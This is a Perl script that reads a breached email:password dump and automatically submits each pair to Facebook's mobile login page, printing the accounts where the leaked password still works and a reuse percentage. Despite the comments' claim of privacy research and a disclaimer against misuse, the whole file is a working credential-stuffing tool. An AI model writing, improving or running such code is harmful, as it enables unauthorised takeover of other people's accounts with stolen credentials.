#!/usr/bin/perl -w
use strict;
use LWP::UserAgent;
#Quick script for going through DB dumps and determining whether passwords are reused.
#Currently only facebook for now, will update to include instagram/gmail/w.e else later...
#Intended purpose is to help analyze privacy impact. I do not encourage malicious use of this script...

our @data; #honestly why even bother passing potentially huge data around functions 

#simple stuff, just read in the dump file
sub promptAndOpen
{
	my $file = "";
	print "Enter email:password dump file: ";
	chomp($file = <STDIN>);
	print "Reading in $file...\n";
	open FILE, $file or die("Failed to open $file for reading! Exiting...\n");
	my @contents = <FILE>;
	close FILE;
	return @contents;
}

#check all email:password combinations against facebook now
sub checkFacebooks
{
	my $curr = '';
	my @usrPwd = ();
	my $resp = "";
	my %fields;
	my $dummy = 0;
	my $total = $#data;
	my $working = 0;
	foreach(@data)
	{
		my $ua = LWP::UserAgent->new; #need to constantly reconstruct LWP object or 301 errors; no real loss in efficiency since http request is costly regardless
        	$ua->cookie_jar({ file => "$ENV{HOME}/Development/cookies.txt" });
        	$ua->timeout(55);
		$ua->default_header('Referer' => "https://m.facebook.com/");
	        $ua->agent("Mozilla/5.0 (X11; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0");
		push @{$ua->requests_redirectable }, 'POST'; #To fix the 302 HTTP found error when using mobile login...
		if($dummy == 0) #THIS IS NECESSARY. Otherwise, facebook will complain about cookies not being enabled, so a dummy request is required...
		{
			$dummy = 1;
			$resp = $ua->get("https://m.facebook.com");
			redo;
		}
		chomp($curr = $_);
		@usrPwd = split(":", $curr);
		chomp($usrPwd[0]);
		chomp($usrPwd[1]);
		$fields{'email'} = $usrPwd[0];
		$fields{'pass'} = $usrPwd[1];
		$resp = $ua->post("https://m.facebook.com/login.php?refsrc=https%3A%2F%2Fm.facebook.com%2F&lwv=100&login_try_number=1&refid=8", \%fields);
		if($resp->is_success)
		{
			if(index($resp->decoded_content, "Recover Your Account") == -1)
			{
				$working++;
				print "[+] $usrPwd[0] reuses their password...!\n";	
			}
			#print "Content for $usrPwd[0] : $usrPwd[1]"."\n". $resp->decoded_content ."\n\n\n";
		}
		else
		{
			print $resp->status_line . "\n";
		}
	}
	my $avg = (($working/$total) * 100);
	print "Finished facebook checks. $working / $total people reuse their passwords ($avg %)\n\n";
}

sub checkGmails
{
}

if($#ARGV < 0)
{
	@data = promptAndOpen();
}
else
{
        print "Reading in $ARGV[0]...\n";
        open FILE, $ARGV[0] or die("Failed to open $ARGV[0] for reading! Exiting...\n");
        @data = <FILE>;
        close FILE;
}
print "Read in data.\n";
print "Checking logins against facebook.\n";
checkFacebooks();

